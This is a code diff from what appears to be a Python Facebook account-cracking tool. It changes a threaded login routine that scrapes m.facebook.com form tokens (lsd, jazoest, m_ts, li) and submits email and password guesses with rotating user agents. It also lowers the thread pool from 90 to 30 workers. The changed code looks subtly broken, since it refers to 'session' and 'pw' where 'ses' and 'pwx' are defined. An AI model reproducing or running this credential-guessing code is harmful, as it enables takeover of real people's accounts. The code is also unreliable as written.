@@ -1129,7 +1129,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=90) as SUMON_xd:
+    with ThreadPool(max_workers=30) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -1758,22 +1758,17 @@ def mbasic(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             ses = requests.Session()
-            p_fb = ses.get("https://m.facebook.com").text
-            lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
-            jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
-            m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
-            li = re.search('name="li" value="(.*?)"', str(p_fb)).group(1)
+            free_fb = session.get('https://m.facebook.com').text
             data = {
-                "lsd": lsd,
-                "jazoest": jazoest,
-                "m_ts": m_ts,
-                "li": li,
-                "try_number": "0",
-                "unrecognized_tries": "0",
-                "email": uid,
-                "pass": pw,
-                "login": "Log In",
-            }
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":pw,
+            "login":"Log In"}
             headers = {
             'authority': 'm.facebook.com',
             'method': 'GET',
